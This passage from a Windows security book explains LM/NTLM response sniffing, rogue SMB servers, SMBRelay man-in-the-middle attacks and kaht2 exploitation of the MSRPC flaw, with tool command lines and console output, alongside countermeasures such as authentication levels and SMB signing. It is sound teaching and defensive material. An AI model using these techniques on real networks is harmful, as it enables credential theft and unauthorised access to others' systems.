Popularity: Simplicity: Impact: Risk Rating:  7 2 10 6  The L0phtcrack  LC  password-auditing tool is possibly one of the most recognized in  the security community and even within mainstream software circles. Unfortunately, LC is  no longer maintained. However, an alternative called LCP is available that contains nearly  all the same functionality as LC. Although L0phtcrack’s primary function is to perform  offline  password  cracking,  the  last  available  versions  shipped  with  an  add-on  module  called SMB Packet Capture, which is capable of sniffing LAN Manager  LM  challenge- response authentication traffic off the network and feeding it into the L0phtcrack cracking  engine. We will discuss password cracking and L0phtcrack in Chapter 7; in this chapter,  we focus on the tool’s ability to capture LM traffic and decode it. Although LCP does not  support direct capture of Windows authentication traffic as L0phtcrack did, it can import  LM hashes from Sniff network capture files. We review L0phtcrack’s functionality here, the  process similar using LCP, with the exception that the LM hashes have to be imported.  As we alluded to in Chapter 2, weaknesses in the LM hash allow an attacker with the  ability to eavesdrop on the network to guess the password hash itself relatively easily  and then attempt to guess the actual password offline—yes, even though the password  hash never traverses the network! An in-depth description of the process of extracting  the  password  hash  from  the  LM  challenge-response  routine  is  available  within  LC’s  documentation, under “Technical Explanation of Network SMB Capture,” but we cover  the essentials of the mechanism here.  The critical issue is the way the LM algorithm creates the user’s hash based on two  separate seven-character segments of the account password. The first 8 bytes are derived  from the first seven characters of the user’s password, and the second 8 bytes are derived  from the eighth through fourteenth characters of the password:  Each chunk can be attacked using exhaustive guessing against every possible 8-byte  combination. Attacking the entire 8-byte “character space”  that is, all possible combinations  of  allowable  characters  up  to  8   is  computationally  quite  easy  with  a  modern  desktop  computer processor. Thus, if an attacker can discover the user’s LM hash, she stands a  good chance of ultimately cracking the actual cleartext password.   Chapter 5:  Hacking Windows-Specific Services   141  So how does SMB Packet Capture obtain the LM hash from the challenge-response  exchange? As shown in Chapter 2, neither the LM nor the NTLM hash is sent over the  wire during NTLM challenge-response authentication. It turns out that the “response”  part of NTLM challenge-response is created by using a derivative of the LM hash to encrypt  the 8-byte “challenge.” Because of the simplicity of the derivation process, the response  is  also  easily  attacked  using  exhaustive  guessing  to  determine  the  original  LM  hash  value.  The  efficiency  of  this  process  is  greatly  improved  depending  on  the  password  length. The end result: LC’s SMB Packet Capture can grab LM hashes off the wire if it can  sniff the LM response. Using a similar mechanism, it can obtain the NTLM challenge- response hashes as well, although it is not currently capable of deriving hashes from  NTLMv2  challenge-response  traffic.  Figure  5-6  shows  SMB  Packet  Capture  at  work  harvesting LM and NTLM responses from a network.  Once the LM and NTLM hashes are derived, they can be imported into LC or LCP, as  shown in Figure 5-7, through standard import functionality  in LCP, this functionality is  available on the Import tab, called Import From Sniff File  and subject to cracking  see  Chapter 7 . Depending on the strength of the passwords, the cracking process may reveal  cleartext passwords in a matter of minutes or hours.  Figure 5-6  L0phtcrack’s SMB Packet Capture snifﬁ ng password-equivalent LM challenge- responses from Windows authentication exchanges over the network   142   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 5-7  The LCP tool at work cracking Windows passwords imported from network sniffer  captures  You  should  note  some  important  things  about  using  LC’s  SMB  Packet  Capture   utility:    LC’s SMB Packet Capture utility is currently unable to derive hashes from logon   exchanges between Windows 2000 and later systems.  A legacy Windows machine  must represent one side of the exchange, client or server.  In our testing, LC 4  was able to derive LM responses only from authentications that involved NT 4  or earlier systems. If both ends of the conversation included only Windows XP,  2000, or Server 2003, LC 4 SMB Packet Capture did not capture any packets.    It can capture challenge-response trafﬁ c only from shared media, not switched.  However, this can be circumvented by using Address Resolution Protocol   ARP  redirection cache poisoning on switched Ethernets  see Hacking Exposed,  Fifth Edition . Another technique to reroute the SMB authentication sequence is  NetBIOS name spooﬁ ng, and this technique is described later in this chapter.    The time to crack challenge-response hashes captured from a network snifﬁ ng completion   scales linearly as you add password hashes to crack. The slowdown results from each  hash being encrypted with a unique challenge so that work done cracking one  password cannot be used again to crack another  which is not the case with hashes obtained from a Registry dump . Thus, ten network challenge-response hashes  will take ten times longer to crack than just one, limiting the effectiveness of this  type of password auditing to speciﬁ c situations.    The included WinPcap packet capture driver must be successfully installed and running  during SMB Packet Capture. LC installs WinPcap automatically, and the driver is  launched at boot time.  To verify correct installation of WinPcap, check to see that WinPcap appears in the  Add Remove Programs Control Panel applet. When running SMB Packet Capture, you    Chapter 5:  Hacking Windows-Specific Services   143  can verify that the driver is loaded by running Computer Management  compmgmgt  .msc  and looking under the System Information Software Environment Drivers node.  The  entry  called  packet_2.1   the  number  may  be  different  for  different  versions  of  WinPcap  should be listed as Running. Also, be sure to disable any personal firewall  software that may be running on your system to ensure that it does not interfere with  WinPcap’s packet capture.  ScoopLM BeatLM Another  great  set  of  tools  for  capturing  LM  responses  and  cracking  them  is  the  ScoopLM  and  BeatLM  tools  from  Urity  at  SecurityFriday.com.  ScoopLM  performs  similarly  to  LC  SMB  Packet  Capture,  but  it  will  also  give  visibility  into  authentication exchanges involving systems newer than NT 4. For example, Figure 5-8  shows  ScoopLM  capturing  password  exchanges  between  a  Windows  server  and  the  following clients: Windows NT 4, XP, and Server 2003.  You can tell which client is which  by the username we selected.   Unfortunately, when you attempt to crack these logon exchanges using BeatLM, you  quickly find that the LM responses in this data are not susceptible to cracking, as we  show in Figure 5-9. Each of the passwords for the user in question is test, and we have  used  a  dictionary  with  the  word  test  in  it. As  you  can  see,  the  NT  4  LM  response  is  cracked  quite  handily,  but  the  Windows  XP  and  Windows  client  responses  are  not,  showing the ERR message in the right column. We’ll discuss the reason for this in the  “Countermeasures” section coming up shortly.  Redirecting SMB Logon to the Attacker  Assuming users can be tricked into connecting to a  server  of  the  attacker’s  choice,  capturing  LM  responses  becomes  much  easier.  This  approach also comes in handy when network switching has been implemented, as it will  invoke authentication sessions proximal to the attacker’s system regardless of network  topology.  Figure 5-8  ScoopLM captures LM NTLM challenge-response authentication between various  clients and a Windows Server 2003 system.   144   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 5-9  BeatLM cracks passwords obtained from LM response snifﬁ ng. Note that it does not  crack passwords from newer Windows versions beginning with Windows XP.  It is also a more granular way to target individual users. The most basic trick was  suggested in one of the early releases of L0phtcrack: Send an e-mail message to the victim  with an embedded hyperlink to a fraudulent server. The victim receives the message, the  hyperlink is followed  manually or automatically , and the client unwittingly sends the  user’s  LM NTLM  credentials  over  the  network.  Such  links  are  easily  disguised  and  typically require little user interaction because Windows automatically tries to log in as the  current user if no other authentication information is explicitly supplied. This is probably one  of the most debilitating behaviors of Windows from a security perspective, and it’s one  that we will touch on again in Chapter 12.  As an example, consider an embedded image tag that renders with HTML in a web   page or e-mail message:        When this HTML renders in Internet Explorer or Outlook Outlook Express, the null.gif  file is loaded and the victim will initiate Windows authentication with attacker_server. The shared resource does not even have to exist. We’ll discuss other such approaches,  including telnet session invocation, in Chapter 10 on client-side hacking.  Once the victim is fooled into connecting to the attacker’s system, the only remaining  feature necessary to complete the exploit is to capture the ensuing LM response, and  we’ve seen how trivial this is using SMB Packet Capture or ScoopLM. Assuming that one  of these tools is listening on attacker_server or its local network segment, the LM NTLM  challenge-response traffic will come pouring in.  One variation on this attack is to set up a rogue Windows server to capture the hashes  as  opposed  to  a  sniffer  like  SMB  Packet  Capture.  Several  tools  can  respond  to  client  authentication  with  a  static  SMB  server  challenge  to  improve  password-cracking  performance. We’ll discuss rogue SMB servers in “Subverting Windows Authentication”  later in this chapter. It is also possible to use ARP redirection cache poisoning to redirect  client traffic to a designated system; see Hacking Exposed, Fifth Edition, Chapter 7.   Chapter 5:  Hacking Windows-Specific Services   145  Countermeasures, or Rather Mitigations,  for Snifﬁ ng Windows Credentials The risk presented by LM response sniffing can be mitigated in several ways.  One way is to ensure that network security best practices are followed. Keep Windows  authentication services within protected networks and ensure that the overall network  infrastructure does not allow LM traffic to pass by untrusted nodes. A corollary of this  remedy is to ensure that physical network access points  wall jacks and so on  are not  available to casual passersby.  Remember that this is made more difficult with the growing  prevalence of wireless networking.  In addition, although it’s generally a good idea to use  features  built  into  networking  equipment  or  Dynamic  Host  Configuration  Protocol   DHCP   to  prevent  intruders  from  registering  physical  and  network-layer  addresses  without authentication, recognize that sniffing attacks do not require the attacker to obtain  a MAC  Media Access Control  or IP address since they operate in promiscuous mode.  In  the  second  case,  configure  all  Windows  systems  within  your  environment  to  disable propagation of the LM hash on the wire. This is done using the Network Security:  LAN  Manager  Authentication  Level  setting  under  Security  Policy   Computer  Configuration Windows  Settings Security  Settings Local  Policies Security  Options  node within the Group Policy or Local Security Policy MMC snap-in . This setting allows  you to configure Windows 2000 and later to perform LM NTLM authentication in one  of six ways  from least secure to most; adapted from KB article Q239869 :    Level 0  Send LM and NTLM response; never use NTLM 2 session security.   Clients use LM and NTLM authentication and never use NTLM 2 session  security; domain controllers accept LM, NTLM, and NTLM 2 authentication.   This is the default on Windows products through Windows XP.     Level 1  Use NTLM 2 session security if negotiated. Clients use LM and NTLM  authentication and use NTLM 2 session security if the server supports it; domain  controllers accept LM, NTLM, and NTLM 2 authentication.    Level 2  Send NTLM response only. Clients use only NTLM authentication and  use NTLM 2 session security if the server supports it; domain controllers accept  LM, NTLM, and NTLM 2 authentication.  This is the default on Windows.     Level 3  Send NTLM 2 response only. Clients use NTLM 2 authentication and  use NTLM 2 session security if the server supports it; domain controllers accept  LM, NTLM, and NTLM 2 authentication.    Level 4  Domain controllers refuse LM responses. Clients use NTLM 2   authentication and use NTLM 2 session security if the server supports it; domain  controllers refuse LM authentication  that is, they accept NTLM and NTLM 2 .    Level 5  Domain controllers refuse LM and NTLM responses  they accept  only NTLM 2 . Clients use NTLM 2 authentication and use NTLM 2 session  security if the server supports it; domain controllers refuse NTLM and LM  authentication  they accept only NTLM 2 .   146   Hacking Exposed Windows: Windows Security Secrets & Solutions   By  setting  LAN  Manager Authentication  Level  to  Level  2,  Send  NTLM  Response  Only, LM response sniffing tools will not be able to derive a hash from challenge-response  authentication.  Settings higher than 2 will also work and are more secure.  Figure 5-10  shows the Windows Security Policy interface in its default setting of the LM Authenti- cation level.  When applying the LM Authentication Level setting on Windows, right-click the top node of the MMC  tree in which the setting is displayed and select Reload. This will apply the setting immediately.  What  about  the  newer  NTLM  and  NTLM  2  protocols?  The  NTLM  response  is  not  susceptible to LM response sniffing, since it is not based on concatenated cryptographic  material that can be attacked in parallel. For example, L0phtcrack’s SMB Packet Capture  will  still  appear  to  have  captured  a  Windows  client’s  LM  response  even  if  its  LM  Authentication Level is set to 2, but once imported into L0phtcrack for cracking, password  hashes derived from NTLM-only responses will not crack within a reasonable timeframe.  As we saw earlier, other LM response sniffing tools like ScoopLM exhibit this same behavior.  The reason for this behavior is usually that the authentication method used is a variant of  NTLM, called ntlm2  not the same as NTLMv2 . These hashes can be cracked using tools  listed in the “References and Further Reading” section. This is not to say that an attacker  cannot crack valid NTLM hashes  as we will see in Chapter 7, it is quite possible .  It is interesting to note that NTLM 2 challenge-responses can be sniffed as well and  are vulnerable to a similar attacks. Links to publicly available tools, and a description,  are available in “References and Further Reading.”  Figure 5-10  The Windows Server 2003 LANMan Authentication Level default setting prevents  sending the vulnerable LM response over the wire.   Chapter 5:  Hacking Windows-Specific Services   147  The LAN Manager Authentication Level setting was configured using the HKLM\ System\CurrentControlSet\Control\LSA\LMCompatibilityLevel  Registry  key  under  NT  4,  where  the  Level  0–5  designations  originated,  even  though  the  numbers  don’t  appear in the Windows Security Policy interface  see KB article Q147706 .  Remember that as long as systems in an environment have not been set to Level 2 or higher, that  environment is vulnerable, even if all servers have been set to Level 4 or 5. Clients will still send the  LM response even if the server doesn’t support it.  One  of  the  biggest  issues  large  organizations  faced  when  deploying  the  old  LMCompatibilityLevel Registry setting was the fact that older Windows clients could  not  send  the  NTLM  response.  This  issue  was  addressed  with  the  Directory  Services  Client,  included  on  the  Windows  2000  CD-ROM  under  Clients\Win9x\Dsclient.exe. Once  installed,  DSClient  allows  Windows  9x  clients  to  send  the  NTLM  2  response.  Windows 9x must still be configured to send only the NTLM 2 response by creating an  LSA Registry key under HKLM\System\CurrentControlSet\Control and then adding  the following registry value: Value Name: LMCompatibility Data Type: REG_DWORD Value: 3 Valid Range: 0,3  On Windows 9x clients with DSClient installed, this Registry value should be named LMCompatibility,  not LMCompatibilityLevel, which is used for the NT 4 setting.  It’s also important to note that the LAN Manager Authentication Level setting applies  to SMB communications. Another Registry key controls the security of Microsoft Remote  Procedure Call  MSRPC  and Windows Integrated Authentication over HTTP on both  client and server  they must match : HKLM\System\CurrentControlSet\control\LSA\MSV1_0 Value Name: NtlmMinClientSec or NtlmMinServerSec Data Type: REG_WORD Value: one of the values below: 0x00000010- Message integrity 0x00000020- Message confidentiality 0x00080000- NTLM 2 session security 0x20000000- 128-bit encryption 0x80000000- 56-bit encryption  Finally, as we’ve noted frequently in this chapter, Windows 2000 and later versions are  capable of performing another type of authentication: Kerberos. Because it is a wholly  different  type  of  authentication  protocol,  it  is  not  vulnerable  to  LM  response  sniffing.  Unfortunately, clients cannot be forced to use Kerberos by simply setting a Registry value  similar to LM Authentication Level, so as long as there are down-level systems in your  environment, it is likely that LM NTLM challenge-response authentication will be used.   148   Hacking Exposed Windows: Windows Security Secrets & Solutions   In addition, in some scenarios, Kerberos will not be used in a homogeneous Windows  2000 or later environment. For example, if the two machines are in a different Windows  2000 forest, Kerberos will not be used  unless a cross-forest trust is enabled, which is  available only in native Windows domains; see Chapter 2 . If the two machines are in the  same forest, Kerberos may be used—but only if the machines are referenced by their  NetBIOS machine names or DNS names; accessing them by IP address will always use  LM NTLM challenge-response. Finally, if an application used within a Windows domain  does  not  support  Kerberos  or  supports  only  legacy  LM NTLM  challenge-response  authentication,  it  will  obviously  not  use  Kerberos,  and  authentication  traffic  will  be  vulnerable to LM response sniffing.  Remember also that to set up Kerberos in a Windows 2000 and later environment,  you must deploy a domain with Active Directory. Some good tools to use to determine  whether Kerberos is being used for specific sessions are the Resource Kit kerbtray utility,  a graphical tool, or the command-line klist tool. We’ll discuss Kerberos in more detail in  Appendix A.  Remember that earlier in this chapter we demonstrated that Kerberos authentication can be sniffed  as well!  SUBVERTING WINDOWS AUTHENTICATION  Finally we reach the last of the three attack vectors we set out to discuss in this chapter.  In  contrast  to  guessing  or  eavesdropping  on  passwords,  this  section  will  focus  on  actually slipping into the authentication stream to harvest credentials and even steal  valid authentication sessions right from the client. Our discussion here is divided into  two parts:  Other methods of subverting the authentication sequence are pass-the-hash attacks  and session piggy-backing. Both of these methods require that the attacker has already  gained access to a target machine and will be discussed further in Chapter 7.     Rogue server attacks    MITM attacks  SMB Redirection  Popularity: Simplicity: Impact: Risk Rating:  2 2 7 4  In May 2001, Sir Dystic of Cult of the Dead Cow wrote and released a tool called  SMBRelay to much fanfare—The Register breathlessly sensationalized the tool with the  headline  “Exploit  Devastates  WinNT 2K  Security,”  apparently  not  aware  of  the  weaknesses in LM authentication that had been around for some time by this point.   Chapter 5:  Hacking Windows-Specific Services   149  SMBRelay is essentially an SMB server that can harvest usernames and password  hashes from incoming SMB traffic. As the name implies, SMBRelay can act as more than  just a rogue SMB endpoint—it also can perform MITM attacks given certain circumstances.  We’ll discuss SMBRelay’s MITM functionality a bit later in the section “MITM Attacks”;  for now, we focus on its use as a simple rogue SMB server. Setting  up  a  rogue  SMBRelay  server  is  quite  simple.  The  first  step  is  to  run  the  SMBRelay  tool  with  the  enumerate  switch    E   to  identify  an  appropriate  physical  interface on which to run the listener: C:\>smbrelay  E SMBRelay v0.992 - TCP  NetBT  level SMB man-in-the-middle relay attack  Copyright 2001: Sir Dystic, Cult of the Dead Cow  Send complaints, ideas and donations to sirdystic@cultdeadcow.com [2] ETHERNET CSMACD - 3Com 10 100 Mini PCI Ethernet Adapter [1] SOFTWARE LOOPBACK - MS TCP Loopback interface  As this example illustrates, the interface with index 2 is the most appropriate to select  because it is a physical card that will be accessible from remote systems  the Loopback  adapter is accessible only to localhost . Of course, with multiple adapters options widen,  but we’ll stick to the simplest case here and use the index 2 adapter in further discussion.  Note that this index number may change between separate usages of SMBRelay.  Starting the server can be tricky on Windows Server 2000 and later systems because  the OS won’t allow another process to bind SMB port TCP 139 when the OS is using it.  One way around this is to disable TCP 139 temporarily by checking Disable NetBIOS  Over TCP IP, an option that can be found by selecting the Properties of the appropriate  Local  Area  Connection,  and  then  selecting  Properties  of  Internet  Protocol   TCP IP ,  clicking the Advanced button, and selecting the appropriate radio button on the WINS  tab, as discussed in Chapter 4. Once this is done, SMBRelay can bind TCP 139.  If disabling TCP 139 is not an option, the attacker must create a virtual IP address on  which to run the rogue SMB server. Thankfully, SMBRelay provides automated functionality  to set up and delete virtual IP addresses using a simple command-line switch,  L+ ip_ address. However, we have experienced erratic results using the  L switch on Windows  2000 and recommend disabling TCP 139, as explained previously, rather than using  L.  One additional detail to consider when using SMBRelay on NT 4 Service Pack 6a and  later: If a modern SMB client fails to connect on TCP 139, it will then attempt an SMB  connection  on  TCP  445.  To  avoid  having  these  later  clients  circumvent  the  rogue  SMBRelay server listening on TCP 139, TCP 445 should be blocked or disabled on the  rogue server. Since the only way to disable TCP 445 leaves TCP 139 intact, the best way  is to block TCP 445 using an IPSec filter  see Appendix A .  The following examples illustrate SMBRelay running on a Windows 2000 host and  assumes that TCP 139 has been disabled  as explained  and that TCP 445 has been blocked  using an IPSec filter. Here’s how to start SMBRelay on Windows 2000, assuming that  interface  index  2  will  be  used  for  the  local  listener  and  relay  address,  and  the  rogue  server will listen on the existing IP address for this interface: C:\>smbrelay  IL 2  IR 2 SMBRelay v0.992 - TCP  NetBT  level SMB man-in-the-middle relay attack   150   Hacking Exposed Windows: Windows Security Secrets & Solutions    Copyright 2001: Sir Dystic, Cult of the Dead Cow  Send complaints, ideas and donations to sirdystic@cultdeadcow.com Using relay adapter index 2: 3Com EtherLink PCI Bound to port 139 on address 192.168.234.34  Subsequently, SMBRelay will begin to receive incoming SMB session negotiations. When  a victim client successfully negotiates an SMB session, here is what SMBRelay does: Connection from 192.168.234.44:1526 Request type: Session Request  72 bytes Source name: CAESARS           Target name: *SMBSERVER        Setting target name to source name and source name to 'CDC4EVER'...

Relay IP address added to interface 2 Bound to port 139 on address 192.1.1.1    relaying for host CAESARS 192.168.234.44  As you can see, both the LM  “case insensitive”  and NTLM  “case sensitive”  passwords  have been captured and written to the file hashes.txt in the current working directory.  This file may be imported into L0phtcrack for cracking.  Because of file format differences with versions later than 2.52, SMBRelay-captured hashes cannot  be imported directly into L0phtcrack.  What’s  even  worse,  the  attacker’s  system  now  can  access  the  client  machine  by  simply connecting to it via the relay address, which defaults to 192.1.1.1. Here’s what this  looks like:   Chapter 5:  Hacking Windows-Specific Services   151  C:\>net use * \\192.1.1.1\c$ Drive E: is now connected to \\192.168.234.252\c$.

First, the original  net use command appears to have failed, throwing system error 64. Running net use will indicate that no drives are mounted. However, running net session will reveal  that  it  is  unwittingly  connected  to  the  spoofed  machine  name   CDC4EVER,  which  SMBRelay sets by default unless changed using the  S name parameter : C:\client>net use \\192.168.234.34\ipc$ *  u:Administrator Type the password for \\192.168.234.34\ipc$: System error 64 has occurred.

Some issues commonly crop up when using SMBRelay. The next example illustrates   those. Our intended victim’s IP address is 192.168.234.223. Connection from 192.168.234.223:2173 Error receiving data from incoming connection   152   Hacking Exposed Windows: Windows Security Secrets & Solutions   This  typically  occurs  when  the  victim  supplies  an  invalid  username password  combination. SMBRelay will continue to listen, but it may encounter further errors: Connection rejected: 192.168.234.223 already connected  Once a connection has been attempted from a given victim’s IP address and fails, all  further  attempts  from  this  address  will  generate  this  error.   This  is  according  to  the  design of the program, as stated in the readme.  You may also experience this issue even  if the initial negotiation is successful but you receive a message like “Login failure code:  0xC000006D.” Restarting SMBRelay alleviates these problems  just press CTRL-C to stop  it . In addition, you may see spurious entries like the following: Connection from 169.254.9.119:2174 Unable to connect to 169.254.9.119:139  This is the Loopback adapter making connections to the SMBRelay server—they are safe  to ignore.  Remember that it is also possible to use ARP redirection cache poisoning to redirect  client traffic to a rogue SMB server; see the fourth edition of Hacking Exposed: Network  Security Secrets & Solutions, Chapter 9.  Countermeasures to SMB Redirection In theory, SMBRelay is quite difficult to defend against. Since it claims to be capable of  negotiating all of the different LM NTLM authentication dialects, it should be able to  capture whatever authentication is directed toward it.  Digitally signing SMB communications  discussed later in the “Countermeasures to  MITM” section  can be used to combat SMBRelay MITM attacks, but it will not always  derail  fraudulent  server  attacks  since  SMBRelay  can  downgrade  secure  channel  negotiation with victim clients if possible. More information about SMB signing can be  found in “References and Further Reading.” The default settings in Windows Vista are  more  restrictive  on  allowing  unsigned  communication  than  previous  versions  of  Windows.  NetBios Name Spooﬁ ng Microsoft Windows supports multiple name resolution protocols. One of the older ones,  NetBios name resolution, works by broadcasting name queries, making it easy to attack. The attack works by having a program listening for broadcast queries on port 137  UDP and replying with a positive name resolution with a IP address of the attacker’s  choice.

Although the concept of SMB MITM attacks was quite old by the time SMBRelay  was released, it was the first widely distributed tool to automate the attack. Here’s an example of setting up MITM with SMBRelay. The attacker in this example  sets up a fraudulent server at 192.168.234.251 using the  L+ switch, a relay address of  192.168.234.252 using  R, and a target server address of 192.168.234.34 with  T: C:\>smbrelay  IL 2  IR 2  R 192.168.234.252  T 192.168.234.220 Bound to port 139 on address 192.168.234.251  A victim client, 192.168.234.220, then connects to the fraudulent server address, thinking  it is talking to the target: Connection from 192.168.234.220:1043 Request type: Session Request  72 bytes Source name: GW2KNT4           Target name: *SMBSERVER        Setting target name to source name and source name to 'CDC4EVER'...

Disabling security signatures  Note  that  the  target  server  has  been  configured  to  require  digitally  signed  SMB  communications, and the SMBRelay attempts to disable the signatures. Request type: Session Message  286 bytes SMB_COM_SESSION_SETUP_ANDX Password lengths: 24 24 Case insensitive password:  A4DA35F982C8E17FA2BBB952CBC01382C210FF29461A71F1 Case sensitive password:    F0C2D1CA8895BD26C7C7E8CAA54E10F1E1203DAD4782FB95 Username:     "Administrator" Domain:       "NT4DOM" OS:           "Windows NT 1381" Lanman type:  "" ???:          "Windows NT 4.0" Response:     Session Message  144 bytes OS:           "Windows NT 4.0" Lanman type:  "NT LAN Manager 4.0" Domain:       "NT4DOM" Password hash written to disk Connected? Relay IP address added to interface 2 Bound to port 139 on address 192.168.234.252 relaying for host GW2KNT4  192.168.234.220  At this point, the attacker has successfully inserted himself into the SMB stream between  victim client and target server and derived the client’s LM and NTLM hashes from the  challenge-response. Connecting to the relay address will give access to the target server’s  resources. For example, here is a separate attack system mounting the C$ share on the  relay address: D:\>net use * \\192.168.234.252\c$ Drive G: is now connected to \\celery\e$.  The command completed successfully.  Here’s what the connection from this attacker’s system  192.168.234.50  looks like on the  SMBRelay server console: *** Relay connection for target GW2KNT4 received from  192.168.234.50:1044  *** Sent positive session response for relay target GW2KNT4  *** Sent dialect selection response  7  for target GW2KNT4  *** Sent SMB Session setup response for relay to GW2KNT4  SMBRelay can be erratic and results are not always this clean, but when implemented  successfully, this is clearly a devastating attack: the MITM has gained complete access to  the target server’s resources without really lifting a finger.   Chapter 5:  Hacking Windows-Specific Services   155  Another MITM technique is SMBProxying, which relies on the attacker being in the  direct route in between the client and the server, acting as a server for the client and as a  client for the server.  Compared to SMBRelaying, this technique targets the SMB protocol and makes it  possible to perform active interaction with the session setup and authentication sequence,  such  as  downgrading  SMB  security  level  and  modifying  challenge  and or  injecting  password hashes.  Downgrading of the authentication is to the attacker’s benefit—it has been pretty  common to downgrade the authentication to cleartext or a weaker crypto. This shows  the importance of setting requirements for sending and demanding higher encryption.  Of course, the key hurdle here is to convince a victim client to authenticate to the  MITM server in the first place, but we’ve already discussed several ways to do this. One  would  be  to  send  a  malicious  e-mail  message  to  the  victim  client  with  an  embedded  hyperlink to the MITM SMBRelay server’s address. The other would be to implement an  ARP poisoning or a NetBios name spoofing attack against an entire segment, causing all  of  the  systems  on  the  segment  to  authenticate  through  the  fraudulent  MITM  server.  Chapter 9 of Hacking Exposed, Fourth Edition, discusses ARP redirection cache poisoning.  Countermeasures to MITM Attacks The seemingly obvious countermeasure to SMBRelay is to configure Windows systems  to  use  SMB  Signing,  which  is  now  referred  to  as  digitally  signing  Microsoft  network  client server communications. SMB Signing was introduced with Windows NT 4 Service  Pack 3 and is discussed in KB article Q161372  see “References and Further Reading” for  more information .  Setting Windows to sign client or server communications digitally will cause it to  sign each block of SMB communications cryptographically. This signature can be checked  by a client or server to ensure the integrity and authenticity of each block, making SMB  server spoofing theoretically impossible  well, highly improbable at least, depending on  the  signing  algorithm  used .  These  settings  are  found  under  Security  Policy Local  Policies Security Options. Thus, if the server supports SMB Signing, Windows will use  it. To force SMB Signing, optionally enable the settings that state Always.  Using SMB Signing incurs network overhead, and it may cause connectivity issues with NT 4 or even  newer systems, even if SMB Signing is enabled on those systems.  Since SMBRelay or -Proxy MITM attacks are essentially legitimate connections, no  telltale log entries appear to indicate that it is occurring. On the victim client, connectivity  issues may arise when connecting to fraudulent MITM servers, including System Error  59,  “An  unexpected  network  error  occurred.”  Using  SMBRelay,  the  connection  will  actually  succeed,  thanks  to  SMBRelay,  but  it  disconnects  the  client  and  hijacks  the  connection for itself.   156   Hacking Exposed Windows: Windows Security Secrets & Solutions   EXPLOITING WINDOWS-SPECIFIC SERVICES  The Windows-specific services were described in Chapter 3  Table 3-2 . Our definition of  “Windows-specific  services”  is  rather  informal,  but  in  essence  it  encompasses  any  remotely  accessible  network  daemon  or  application  that  is  proprietary  to  Microsoft  Corporation or that is a Microsoft proprietary implementation of a standard protocol   such as HTTP or Kerberos . This section covers remote exploits of these services.  Another key differentiator for this section of the chapter is the focus on exploitation of  these  services.  Although  we  have  discussed  password  guessing,  eavesdropping  on  logons, and other techniques to take advantage of many of these services already in this  chapter,  this  section  focuses  on  exploiting  known  bugs  in  service  software  code.  Put  another way, this section covers “point-and-click” exploitation of a vulnerable service.  As Microsoft continues to improve the security of the base Windows platform, attacks  will likely trend toward applications, rather than operating system services. For example,  Windows  Vista  has  gone  through  a  considerable  amount  of  engineering  to  introduce  technologies to make exploitation more difficult—randomizing memory addresses, code  reviews, non-executable bits, and so on  see Chapter 12 . For an attacker this means that  the operating system might not be such an easy target anymore, at least compared to  applications  running  on  the  system.  One  recent  example   as  of  this  writing   is  Core  Security’s exploit of the CA BrightStor ArcServe application running on Vista.  MSRPC Interface Buffer Overﬂ ows  Blaster Worm   Popularity: Simplicity: Impact:  Risk Rating:  10 10 10 10  Much like later SQL Slammer  see Chapter 9 , the genesis of the Blaster worm was in  a Microsoft published security bulletin about a serious vulnerability in a nearly forgotten  protocol that was nevertheless ubiquitous across computing infrastructures worldwide:  the MSRPC Endpoint Mapper. This vulnerability is exploitable via TCP UDP 135, 139,  445, and 593  and also via HTTP if COM Internet Services is installed on Windows 2000 . The  actual  vulnerability  is  in  a  low-level  Distributed  Component  Object  Model   DCOM  interface within the RPC process. Successful exploitation of the issue leads to  LocalSystem-equivalent privileges, the worst kind of remote compromise.  In early August 2003, soon after the Microsoft bulletin describing this vulnerability was  published, several security research groups released proof-of-concept code to exploit the  buffer overflow; sure enough, an automated worm was soon released and infected more  than 400,000 unpatched machines. This worm was originally dubbed the LOVESAN worm  but is now more commonly known as Blaster. Details of the worm’s activities and payload  can be found on any reputable antivirus vendor’s website; basically, this legion of infected  computers was harnessed to launch a distributed denial of service  DDoS, see Chapter 8   attack  against  the  windowsupdate.com  domain  beginning  on  August  16,  2003,  and  continuing until December. This sort of blatant targeting of corporate infrastructures and  the  attack’s  sheer  scale  were  unprecedented,  but  fortunately,  the  windowsupdate.com    Chapter 5:  Hacking Windows-Specific Services   157  domain was not actually used anymore by Microsoft Corporation, which simply removed  the DNS records for that domain and thereby squelched the threat. It will be interesting to  see how the Internet community reacts to more thoughtfully crafted worms in the future. In parallel with and subsequent to Blaster’s meteoric rise and fall, several other tools  aimed at exploited the MSRPC issue surfaced on the Internet. One of the more frightening  ones was a program called kaht2, which scanned a user-defined range of IP addresses for  the MSRPC bug, and then popped a shell back to the attacker for each vulnerable system  it found. Kaht2 is shown here scanning a Class C–sized subnet: _________________________________________________            KAHT II - MASSIVE RPC EXPLOIT   DCOM RPC exploit.

C:\WINNT\system32> C:\WINNT\system32>whoami whoami nt authority\system  As you can see from this output, kaht2 finds a vulnerable Windows XP machine, sends  an exploit to port 135, and then pops a shell back that runs as LocalSystem.  We’ve experienced interesting results using kaht2—sometimes it seems to be unable to find open  ports, and on one victim Windows system, it caused the RPC service to terminate, and the system  forcibly shut itself down within 20 seconds.  Unfortunately, the fun didn’t stop with the first MSRPC interface vulnerability. On  September 10, 2003, Microsoft announced a second remote code exploiting vulnerability  in  the  same  MSRPC DCOM  interface  code.  The  second  vulnerability  had  the  same  essential severity and impact as the first. Although most organizations tightened up their  defenses following the Blaster outbreak, the appearance of a second bulletin concerning  the same code so close to the first was disconcerting to customers who spent a lot of  effort and downtime patching the first bug. Hopefully, Microsoft has now fixed all of the  security issues with MSRPC interfaces. Nevertheless, the days of blithely assuming no  threat exists via MSRPC on its various ports are over.   158   Hacking Exposed Windows: Windows Security Secrets & Solutions   One  final  interesting  point  about  Blaster  is  that  the  worm  came  after  the  public  advisory and exploit. It would seem that use of such a so-called “0-day exploit” in a  worm would be most desirable, since there’s no patch. In practice, it is unusual to see 0- days used on such a scale since it typically leads to faster patching and the “loss” of a  valuable bug to the attack community—one potentially used for criminal purposes.  Countermeasures to MSRPC Interface Buffer Overﬂ ows Microsoft announced a standard two-point approach to preventing attacks against this  vulnerability:  1.  Block network ports used to exploit this issue. These include UDP ports 135,   137, 138, and 445; TCP ports 135, 139, 445, and 593; and COM Internet Services   CIS  and RPC over HTTP, which listen on ports 80 and 443.        2.  Get the patch.  For those who really want to sacrifice usability for security, disabling DCOM per KB  article 825750 will, of course, prevent this and future problems from occurring. However,  this severely hampers remote communication with and from the affected machine, so  test this option thoroughly for compatibility with your business before implementing.  IIS SSL PCT Exploit  Popularity: 